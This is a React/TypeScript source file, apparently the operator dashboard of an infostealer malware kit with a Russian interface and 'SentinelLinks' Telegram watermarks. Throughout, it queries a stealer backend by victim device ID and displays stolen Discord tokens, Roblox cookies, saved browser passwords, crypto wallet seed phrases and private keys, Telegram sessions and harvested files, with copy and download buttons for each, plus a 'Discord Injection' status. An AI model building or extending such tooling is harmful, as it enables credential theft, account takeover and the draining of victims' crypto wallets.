// t.me/SentinelLinks

"use client"

import { useState, useEffect, useRef } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import type { User } from "@/app/page"
import {
  Download,
  RefreshCw,
  Copy,
  Check,
  Chrome,
  Shield,
  FileText,
  UserIcon,
  Coins,
  Eye,
  EyeOff,
  ChevronRight,
  X,
  Folder,
  AlertTriangle,
  FileIcon,
  Wallet,
  MessageSquare,
  Lock,
} from "lucide-react"
import { cn } from "@/lib/utils"
import { toast } from "sonner"

interface StealerTabProps {
  selectedUser: User
  currentUser: {
    // Simplified currentUser interface
    username: string
    isAdmin: boolean
    uid?: string
  }
}

interface DiscordAccount {
  number: number
  username: string
  displayName: string
  id: string
  email: string
  phone: string
  nitro: string | boolean // Adjusted type for nitro
  mfa: boolean
  token: string
  software: string
  path: string
  profilePicture?: string // Made optional
}

// t.me/SentinelLinks
interface RobloxAccount {
  number: number
  username: string
  userId: string // Renamed from id
  robux: number // Added robux
  premium: boolean // Added premium
  cookie: string
}

interface BrowserData {
  // Renamed and restructured
  passwords: number
  cookies: number
  history: number
}

interface FileNode {
  name: string
  path: string
  type: "file" | "folder"
  size?: string // Made optional and string
  children?: FileNode[]
}

interface CryptoWallet {
  name: string
  path: string
  seedPhrase?: string
  privateKeys?: string[]
}

interface TelegramSession {
  phoneNumber: string
  username: string
  sessionPath: string
}

interface BrowserPassword {
  url: string
  username: string
  password: string
  browser: string
}

export function StealerTab({ selectedUser, currentUser }: StealerTabProps) {
  const [isLoading, setIsLoading] = useState(false)
  const [discordAccounts, setDiscordAccounts] = useState<DiscordAccount[]>([])
  const [robloxAccounts, setRobloxAccounts] = useState<RobloxAccount[]>([])
  // Updated state for browser data
  const [browserData, setBrowserData] = useState<BrowserData>({ passwords: 0, cookies: 0, history: 0 })
  const [interestingFiles, setInterestingFiles] = useState<FileNode[]>([])
  const [cryptoWallets, setCryptoWallets] = useState<CryptoWallet[]>([])
  const [telegramSessions, setTelegramSessions] = useState<TelegramSession[]>([])
  const [browserPasswords, setBrowserPasswords] = useState<BrowserPassword[]>([])
  const [copiedToken, setCopiedToken] = useState<string | null>(null)
  const [visibleTokens, setVisibleTokens] = useState<Set<number>>(new Set())
  const [lastUpdate, setLastUpdate] = useState<Date | null>(null)
  const [currentPath, setCurrentPath] = useState<string[]>([])
  const [selectedFileContent, setSelectedFileContent] = useState<{
    name: string
    content: string
    path: string
  } | null>(null)
  const [injectionStatus, setInjectionStatus] = useState<string>("")

  const hasFetched = useRef(false)
  const currentUserHwid = useRef<string | null>(null) // Keep this for potential future use or debugging

  const fetchStealerData = async () => {
    if (!selectedUser) return

    setIsLoading(true)

    try {
      const response = await fetch("/api/stealer/execute", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          deviceId: selectedUser.ip || selectedUser.id,
        }),
      })

      if (response.ok) {
        const result = await response.json()
        if (result.success && result.data) {
          setDiscordAccounts(result.data.discord || [])
          setRobloxAccounts(result.data.roblox || [])
          setBrowserData({
            passwords: result.data.browser?.passwords || 0,
            cookies: result.data.browser?.cookies || 0,
            history: result.data.browser?.history || 0,
          })
          setInterestingFiles(result.data.files || [])
          setCryptoWallets(result.data.crypto || [])
          setTelegramSessions(result.data.telegram || [])
          setBrowserPasswords(result.data.passwords || [])
          setInjectionStatus(result.data.injection || "")
          setLastUpdate(new Date())
          toast.success("Данные успешно загружены с ПК", {
            description: `Discord: ${result.data.discord?.length || 0}, Crypto: ${result.data.crypto?.length || 0}, Passwords: ${result.data.passwords?.length || 0}`,
          })
          return
        } else {
          toast.error("Нет данных", {
            description: result.error || "Stealer не вернул данные с устройства",
          })
        }
      } else {
        const errorData = await response.json().catch(() => ({}))
        toast.error("Ошибка загрузки данных", {
          description: errorData.error || "Сервер не ответил или устройство недоступно",
        })
      }
    } catch (error) {
      console.error("Error fetching stealer data:", error)
      toast.error("Ошибка подключения", {
        description: "Не удалось подключиться к Python серверу. Проверьте что grob-server-full.py запущен",
      })
    } finally {
      setIsLoading(false)
    }
  }

  // Removed generateMockStealerData as it's not used in the updates

  // Removed parseFilesToTree as it's not used in the updates

  // Removed getCurrentContents as it's replaced by getCurrentFiles
  // Removed navigateToFolder (old version)
  // Removed navigateBack (old version)
  // Removed navigateToPathIndex (old version)

  // Removed viewFileContent (old version) as it's handled within the file rendering

  const formatFileSize = (bytes: number): string => {
    // Keep for potential use, though current FileNode uses string for size
    if (bytes === 0) return "0 B"
    const k = 1024
    const sizes = ["B", "KB", "MB", "GB"]
    const i = Math.floor(Math.log(bytes) / Math.log(k))
    return `${Number.parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`
  }

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text)
    setCopiedToken(id)
    toast.success("Скопировано в буфер обмена")
    setTimeout(() => setCopiedToken(null), 2000)
  }

  const toggleTokenVisibility = (number: number) => {
    // Simplified logic
    const newSet = new Set(visibleTokens)
    if (newSet.has(number)) {
      newSet.delete(number)
    } else {
      newSet.add(number)
    }
    setVisibleTokens(newSet)
  }

  const downloadData = (data: any, filename: string) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = filename
    a.click()
    URL.revokeObjectURL(url)
    toast.success("Файл скачан") // Added toast
  }

  // Removed old navigateToFolder, navigateBack, navigateToPathIndex

  const navigateToFolder = (folder: FileNode) => {
    // New navigateToFolder
    setCurrentPath([...currentPath, folder.name])
  }

  const navigateBack = () => {
    // New navigateBack
    setCurrentPath(currentPath.slice(0, -1))
  }

  // New function to get current files
  const getCurrentFiles = (): FileNode[] => {
    let current = interestingFiles
    for (const pathSegment of currentPath) {
      const folder = current.find((f) => f.name === pathSegment && f.type === "folder")
      if (folder && folder.children) {
        current = folder.children
      } else {
        return []
      }
    }
    return current
  }

  useEffect(() => {
    const userHwid = selectedUser?.hwid || selectedUser?.id

    if (selectedUser && userHwid !== currentUserHwid.current) {
      currentUserHwid.current = userHwid
      hasFetched.current = false
      setDiscordAccounts([])
      setRobloxAccounts([])
      // Resetting browser data
      setBrowserData({ passwords: 0, cookies: 0, history: 0 })
      setInterestingFiles([])
      setCryptoWallets([])
      setTelegramSessions([])
      setBrowserPasswords([])
      setInjectionStatus("")
      setLastUpdate(null)
    }

    // Simplified useEffect for fetching data
    if (selectedUser && !hasFetched.current) {
      hasFetched.current = true
      fetchStealerData()
    }
  }, [selectedUser, currentUser.uid]) // Keep currentUser.uid dependency for context

  useEffect(() => {
    setCurrentPath([])
    setSelectedFileContent(null)
  }, [selectedUser?.id]) // Keep this for resetting on user change

  // Get current files based on the path
  const currentContents = getCurrentFiles() // Renamed from getCurrentContents

  return (
    <div className="flex-1 bg-background p-6 overflow-auto relative">
      <div className="fixed inset-0 -z-10 overflow-hidden pointer-events-none">
        <div className="absolute inset-0 bg-gradient-to-br from-red-500/5 via-background to-purple-500/5 animate-[gradient-shift_8s_ease_infinite] bg-[length:400%_400%]" />
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-red-500/10 rounded-full blur-3xl animate-pulse opacity-20" />
        <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-purple-500/10 rounded-full blur-3xl animate-pulse opacity-20 [animation-delay:1s]" />
      </div>

      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="text-2xl font-bold flex items-center gap-2 bg-gradient-to-r from-red-500 to-purple-500 bg-clip-text text-transparent">
            <Shield className="w-6 h-6 text-red-500" />
            Data Stealer
          </h2>
          <p className="text-sm text-muted-foreground mt-1">
            {lastUpdate ? `Последнее обновление: ${lastUpdate.toLocaleTimeString()}` : "Нет данных"}
          </p>
        </div>
        <Button
          onClick={() => {
            hasFetched.current = false
            fetchStealerData()
          }}
          disabled={isLoading}
          className="gap-2"
        >
          <RefreshCw className={cn("w-4 h-4", isLoading && "animate-spin")} />
          Обновить
        </Button>
      </div>

      {/* Updated conditional rendering for no data */}
      {!isLoading &&
        discordAccounts.length === 0 &&
        robloxAccounts.length === 0 &&
        browserData.passwords === 0 && // Updated to use browserData
        browserData.cookies === 0 &&
        interestingFiles.length === 0 &&
        cryptoWallets.length === 0 &&
        telegramSessions.length === 0 &&
        browserPasswords.length === 0 &&
        lastUpdate === null && (
          <Card className="mb-6 border-amber-500/50 bg-amber-500/5">
            <CardContent className="p-4 flex items-center gap-3">
              <AlertTriangle className="w-5 h-5 text-amber-500" />
              <div>
                <p className="font-semibold text-amber-500">Данные не найдены</p>
                <p className="text-sm text-muted-foreground">Нажмите "Обновить" чтобы загрузить данные с устройства</p>
              </div>
            </CardContent>
          </Card>
        )}

      {/* File Content Modal - remains largely the same */}
      {selectedFileContent && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <Card className="w-full max-w-4xl max-h-[80vh] flex flex-col">
            <CardHeader className="flex-row items-center justify-between space-y-0 pb-4">
              <div>
                <CardTitle className="text-lg">{selectedFileContent.name}</CardTitle>
                <CardDescription className="font-mono text-xs mt-1">{selectedFileContent.path}</CardDescription>
              </div>
              <Button variant="ghost" size="icon" onClick={() => setSelectedFileContent(null)}>
                <X className="w-5 h-5" />
              </Button>
            </CardHeader>
            <CardContent className="flex-1 overflow-hidden">
              <div className="bg-secondary/40 rounded-lg p-4 overflow-auto max-h-[60vh] font-mono text-sm">
                <pre className="whitespace-pre-wrap break-all">{selectedFileContent.content}</pre>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      <div className="max-w-6xl mx-auto space-y-6">
        <Tabs defaultValue="discord" className="space-y-6">
          <TabsList className="grid w-full grid-cols-7">
            <TabsTrigger value="discord" className="gap-2">
              <UserIcon className="w-4 h-4" />
              Discord ({discordAccounts.length})
            </TabsTrigger>
            <TabsTrigger value="roblox" className="gap-2">
              <Coins className="w-4 h-4" />
              Roblox ({robloxAccounts.length})
            </TabsTrigger>
            <TabsTrigger value="browsers" className="gap-2">
              <Chrome className="w-4 h-4" />
              Браузеры
            </TabsTrigger>
            <TabsTrigger value="passwords" className="gap-2">
              <Lock className="w-4 h-4" />
              Пароли ({browserPasswords.length})
            </TabsTrigger>
            <TabsTrigger value="crypto" className="gap-2">
              <Wallet className="w-4 h-4" />
              Крипто ({cryptoWallets.length})
            </TabsTrigger>
            <TabsTrigger value="telegram" className="gap-2">
              <MessageSquare className="w-4 h-4" />
              Telegram ({telegramSessions.length})
            </TabsTrigger>
            <TabsTrigger value="files" className="gap-2">
              <FileText className="w-4 h-4" />
              Файлы ({interestingFiles.length})
            </TabsTrigger>
          </TabsList>

          {/* Discord Tab */}
          <TabsContent value="discord" className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-semibold">Discord Токены</h3>
              <Button
                variant="outline"
                size="sm"
                onClick={() => downloadData(discordAccounts, "discord_tokens.json")}
                disabled={discordAccounts.length === 0}
              >
                <Download className="w-4 h-4 mr-2" />
                Скачать JSON {/* Changed from Скачать все */}
              </Button>
            </div>

            {/* Loading state for Discord */}
            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">Загрузка данных Discord...</div>
            ) : discordAccounts.length === 0 ? (
              <Card>
                <CardContent className="p-12 text-center">
                  <AlertTriangle className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Discord аккаунты не найдены</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-4">
                {discordAccounts.map((account) => (
                  <Card key={account.number}>
                    <CardHeader>
                      <div className="flex items-start justify-between">
                        <div className="flex items-center gap-3">
                          {account.profilePicture && (
                            <img
                              src={account.profilePicture || "/placeholder.svg"}
                              alt={account.username}
                              className="w-12 h-12 rounded-full"
                            />
                          )}
                          <div>
                            <CardTitle className="text-base">{account.username}</CardTitle>
                            <CardDescription>{account.displayName}</CardDescription>
                          </div>
                        </div>
                        {/* Updated nitro display logic */}
                        <Badge variant={account.nitro !== "False" && account.nitro ? "default" : "secondary"}>
                          {account.nitro !== "False" && account.nitro ? `Nitro: ${account.nitro}` : "Free"}
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div className="grid grid-cols-2 gap-3 text-sm">
                        <div>
                          <span className="text-muted-foreground">Email:</span>
                          <p className="font-medium">{account.email || "N/A"}</p>
                        </div>
                        <div>
                          <span className="text-muted-foreground">ID:</span>
                          <p className="font-medium">{account.id}</p>
                        </div>
                        <div>
                          <span className="text-muted-foreground">Телефон:</span>
                          <p className="font-medium">{account.phone || "Не указан"}</p>
                        </div>
                        <div>
                          <span className="text-muted-foreground">MFA:</span>
                          <p className="font-medium">{account.mfa ? "Включено" : "Выключено"}</p>
                        </div>
                      </div>

// t.me/SentinelLinks
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <span className="text-sm text-muted-foreground">Token:</span>
                          <Button variant="ghost" size="sm" onClick={() => toggleTokenVisibility(account.number)}>
                            {visibleTokens.has(account.number) ? (
                              <EyeOff className="w-4 h-4" />
                            ) : (
                              <Eye className="w-4 h-4" />
                            )}
                          </Button>
                        </div>
                        <div className="flex items-center gap-2">
                          <code className="flex-1 p-2 bg-secondary rounded text-xs overflow-hidden text-ellipsis whitespace-nowrap">
                            {visibleTokens.has(account.number)
                              ? account.token
                              : "•".repeat(Math.min(account.token?.length || 50, 50))}
                          </code>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => copyToClipboard(account.token, `discord-${account.number}`)}
                          >
                            {copiedToken === `discord-${account.number}` ? (
                              <Check className="w-4 h-4 text-green-500" />
                            ) : (
                              <Copy className="w-4 h-4" />
                            )}
                          </Button>
                        </div>
                      </div>

                      <div className="text-xs text-muted-foreground pt-2 border-t">
                        <p>Источник: {account.software}</p>
                        <p className="truncate">Путь: {account.path}</p>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>

          {/* Roblox Tab */}
          <TabsContent value="roblox" className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-semibold">Roblox Аккаунты</h3>
              <Button
                variant="outline"
                size="sm"
                onClick={() => downloadData(robloxAccounts, "roblox_accounts.json")}
                disabled={robloxAccounts.length === 0}
              >
                <Download className="w-4 h-4 mr-2" />
                Скачать JSON {/* Changed from Скачать все */}
              </Button>
            </div>

            {/* Loading state for Roblox */}
            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">Загрузка данных Roblox...</div>
            ) : robloxAccounts.length === 0 ? (
              <Card>
                <CardContent className="p-12 text-center">
                  <AlertTriangle className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Roblox аккаунты не найдены</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-4">
                {robloxAccounts.map((account) => (
                  <Card key={account.number}>
                    <CardHeader>
                      <div className="flex items-start justify-between">
                        <div>
                          <CardTitle className="text-base">{account.username}</CardTitle>
                          <CardDescription>ID: {account.userId}</CardDescription>{" "}
                          {/* Changed from account.id to account.userId */}
                        </div>
                        {/* Updated premium display logic */}
                        <Badge variant={account.premium ? "default" : "secondary"}>
                          {account.premium ? "Premium" : "Free"}
                        </Badge>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      {/* Added Robux and Premium display */}
                      <div className="flex items-center justify-between p-3 bg-amber-500/10 rounded-lg border border-amber-500/20">
                        <span className="text-sm font-medium">Robux:</span>
                        <span className="text-2xl font-bold text-amber-500">{account.robux.toLocaleString()}</span>
                      </div>

                      <div className="space-y-2">
                        <span className="text-sm text-muted-foreground">Cookie:</span>
                        <div className="flex items-center gap-2">
                          <code className="flex-1 p-2 bg-secondary rounded text-xs truncate">{account.cookie}</code>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => copyToClipboard(account.cookie, `roblox-${account.number}`)}
                          >
                            {copiedToken === `roblox-${account.number}` ? (
                              <Check className="w-4 h-4 text-green-500" />
                            ) : (
                              <Copy className="w-4 h-4" />
                            )}
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>

          {/* Browsers Tab */}
          <TabsContent value="browsers" className="space-y-4">
            <h3 className="text-lg font-semibold">Данные браузеров</h3>

// t.me/SentinelLinks
            <div className="grid grid-cols-3 gap-4">
              <Card>
                <CardContent className="p-6 text-center">
                  <div className="w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center mx-auto mb-3">
                    <Shield className="w-6 h-6 text-primary" />
                  </div>
                  <p className="text-3xl font-bold">{browserData.passwords}</p> {/* Updated to use browserData */}
                  <p className="text-sm text-muted-foreground">Паролей</p>
                </CardContent>
              </Card>

              <Card>
                <CardContent className="p-6 text-center">
                  <div className="w-12 h-12 rounded-full bg-amber-500/10 flex items-center justify-center mx-auto mb-3">
                    <Chrome className="w-6 h-6 text-amber-500" />
                  </div>
                  <p className="text-3xl font-bold">{browserData.cookies}</p> {/* Updated to use browserData */}
                  <p className="text-sm text-muted-foreground">Cookies</p>
                </CardContent>
              </Card>

              <Card>
                <CardContent className="p-6 text-center">
                  <div className="w-12 h-12 rounded-full bg-blue-500/10 flex items-center justify-center mx-auto mb-3">
                    <FileText className="w-6 h-6 text-blue-500" />
                  </div>
                  <p className="text-3xl font-bold">{browserData.history}</p> {/* Updated to use browserData */}
                  <p className="text-sm text-muted-foreground">История</p>
                </CardContent>
              </Card>
            </div>

            {/* Updated download button for browser data */}
            <Button
              variant="outline"
              className="w-full bg-transparent"
              onClick={() =>
                downloadData(
                  { passwords: browserData.passwords, cookies: browserData.cookies, history: browserData.history }, // Updated to use browserData
                  "browser_data.json",
                )
              }
            >
              <Download className="w-4 h-4 mr-2" />
              Скачать все данные браузера
            </Button>
          </TabsContent>

          {/* Passwords Tab */}
          <TabsContent value="passwords" className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-semibold">Сохраненные Пароли</h3>
              <Button
                variant="outline"
                size="sm"
                onClick={() => downloadData(browserPasswords, "passwords.json")}
                disabled={browserPasswords.length === 0}
              >
                <Download className="w-4 h-4 mr-2" />
                Скачать JSON
              </Button>
            </div>

            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">Загрузка паролей...</div>
            ) : browserPasswords.length === 0 ? (
              <Card>
                <CardContent className="p-12 text-center">
                  <AlertTriangle className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Пароли не найдены</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-3">
                {browserPasswords.map((pass, idx) => (
                  <Card key={idx}>
                    <CardContent className="p-4">
                      <div className="flex items-center justify-between mb-2">
                        <div className="font-medium truncate flex-1">{pass.url}</div>
                        <Badge variant="outline">{pass.browser}</Badge>
                      </div>
                      <div className="grid grid-cols-2 gap-2 text-sm">
                        <div>
                          <span className="text-muted-foreground">Username:</span>
                          <p className="font-medium truncate">{pass.username}</p>
                        </div>
                        <div className="flex items-center gap-2">
                          <div className="flex-1">
                            <span className="text-muted-foreground">Password:</span>
                            <code className="block p-1 bg-secondary rounded text-xs truncate">
                              {visibleTokens.has(idx) ? pass.password : "•".repeat(12)}
                            </code>
                          </div>
                          <Button variant="ghost" size="sm" onClick={() => toggleTokenVisibility(idx)}>
                            {visibleTokens.has(idx) ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </Button>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => copyToClipboard(pass.password, `pass-${idx}`)}
                          >
                            {copiedToken === `pass-${idx}` ? (
                              <Check className="w-4 h-4 text-green-500" />
                            ) : (
                              <Copy className="w-4 h-4" />
                            )}
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>

          {/* Crypto Tab */}
          <TabsContent value="crypto" className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-semibold">Криптовалютные Кошельки</h3>
              <Button
                variant="outline"
                size="sm"
                onClick={() => downloadData(cryptoWallets, "crypto_wallets.json")}
                disabled={cryptoWallets.length === 0}
              >
                <Download className="w-4 h-4 mr-2" />
                Скачать JSON
              </Button>
            </div>

            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">Загрузка кошельков...</div>
            ) : cryptoWallets.length === 0 ? (
              <Card>
                <CardContent className="p-12 text-center">
                  <AlertTriangle className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Криптовалютные кошельки не найдены</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-4">
                {cryptoWallets.map((wallet, idx) => (
                  <Card key={idx}>
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <CardTitle className="text-base flex items-center gap-2">
                          <Wallet className="w-5 h-5 text-amber-500" />
                          {wallet.name}
                        </CardTitle>
                        <Badge variant="default">Найден</Badge>
                      </div>
                      <CardDescription className="font-mono text-xs truncate">{wallet.path}</CardDescription>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      {wallet.seedPhrase && (
                        <div>
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-sm font-medium">Seed Phrase:</span>
                            <Button
                              variant="ghost"
                              size="sm"
                              onClick={() => copyToClipboard(wallet.seedPhrase!, `seed-${idx}`)}
                            >
                              {copiedToken === `seed-${idx}` ? (
                                <Check className="w-4 h-4 text-green-500" />
                              ) : (
                                <Copy className="w-4 h-4" />
                              )}
                            </Button>
                          </div>
                          <code className="block p-2 bg-secondary rounded text-xs break-all">{wallet.seedPhrase}</code>
                        </div>
                      )}
                      {wallet.privateKeys && wallet.privateKeys.length > 0 && (
                        <div>
                          <span className="text-sm font-medium">Private Keys: ({wallet.privateKeys.length})</span>
                          <div className="mt-2 space-y-2">
                            {wallet.privateKeys.slice(0, 3).map((key, keyIdx) => (
                              <div key={keyIdx} className="flex items-center gap-2">
                                <code className="flex-1 p-2 bg-secondary rounded text-xs truncate">{key}</code>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => copyToClipboard(key, `key-${idx}-${keyIdx}`)}
                                >
                                  {copiedToken === `key-${idx}-${keyIdx}` ? (
                                    <Check className="w-4 h-4 text-green-500" />
                                  ) : (
                                    <Copy className="w-4 h-4" />
                                  )}
                                </Button>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>

          {/* Telegram Tab */}
          <TabsContent value="telegram" className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-semibold">Telegram Сессии</h3>
              <Button
                variant="outline"
                size="sm"
                onClick={() => downloadData(telegramSessions, "telegram_sessions.json")}
                disabled={telegramSessions.length === 0}
              >
                <Download className="w-4 h-4 mr-2" />
                Скачать JSON
              </Button>
            </div>

            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">Загрузка сессий Telegram...</div>
            ) : telegramSessions.length === 0 ? (
              <Card>
                <CardContent className="p-12 text-center">
                  <AlertTriangle className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Telegram сессии не найдены</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-4">
                {telegramSessions.map((session, idx) => (
                  <Card key={idx}>
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <div>
                          <CardTitle className="text-base flex items-center gap-2">
                            <MessageSquare className="w-5 h-5 text-blue-500" />
                            {session.username || "Без имени"}
                          </CardTitle>
                          <CardDescription>{session.phoneNumber}</CardDescription>
                        </div>
                        <Badge variant="default">Активна</Badge>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <div className="text-sm">
                        <span className="text-muted-foreground">Путь к сессии:</span>
                        <code className="block mt-1 p-2 bg-secondary rounded text-xs truncate">
                          {session.sessionPath}
                        </code>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </TabsContent>

          {/* Files Tab */}
          <TabsContent value="files" className="space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-lg font-semibold">Интересные файлы</h3>
              {/* Removed the download button for the list, it's now per file or implicitly handled */}
              {/* Added conditional rendering for "Back" button */}
              {currentPath.length > 0 && (
                <Button variant="outline" size="sm" onClick={navigateBack}>
                  Назад
                </Button>
              )}
            </div>

            {/* Path navigation */}
            {currentPath.length > 0 && (
              <div className="flex items-center gap-2 text-sm text-muted-foreground">
                <Folder className="w-4 h-4" />
                {currentPath.map((segment, index) => (
                  <div key={index} className="flex items-center gap-2">
                    <ChevronRight className="w-3 h-3" />
                    <span>{segment}</span>
                  </div>
                ))}
              </div>
            )}

            {/* Loading state for Files */}
            {isLoading ? (
              <div className="text-center py-12 text-muted-foreground">Загрузка файлов...</div>
            ) : currentContents.length === 0 ? ( // Using currentContents
              <Card>
                <CardContent className="p-12 text-center">
                  <AlertTriangle className="w-12 h-12 text-muted-foreground mx-auto mb-4" />
                  <p className="text-muted-foreground">Файлы не найдены</p>
                </CardContent>
              </Card>
            ) : (
              <div className="grid gap-2">
                {currentContents.map(
                  (
                    item,
                    index, // Changed to item and index
                  ) => (
                    <Card
                      key={index} // Changed key to index
                      className={cn(
                        "p-4 hover:bg-secondary/50 transition-colors", // Added padding and hover effect
                        item.type === "folder" && "cursor-pointer",
                      )}
                      // Updated onClick for folders
                      onClick={() => item.type === "folder" && navigateToFolder(item)}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          {item.type === "folder" ? (
                            <Folder className="w-5 h-5 text-primary" />
                          ) : (
                            <FileIcon className="w-5 h-5 text-muted-foreground" /> // Using FileIcon
                          )}
                          <div>
                            <p className="font-medium text-sm">{item.name}</p>
                            {item.size && <p className="text-xs text-muted-foreground">{item.size}</p>}{" "}
                            {/* Display size if available */}
                          </div>
                        </div>
                        {item.type === "file" && (
                          <Button variant="outline" size="sm">
                            {" "}
                            {/* Added download button for files */}
                            <Download className="w-4 h-4" />
                          </Button>
                        )}
                      </div>
                    </Card>
                  ),
                )}
              </div>
            )}
          </TabsContent>
        </Tabs>

        {/* Discord Injection Status Card */}
        {injectionStatus && (
          <Card className="border-green-500/50 bg-green-500/5">
            <CardContent className="p-4 flex items-center gap-3">
              <Check className="w-5 h-5 text-green-500" />
              <div>
                <p className="font-semibold text-green-500">Discord Injection</p>
                <p className="text-sm text-muted-foreground">{injectionStatus}</p>
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
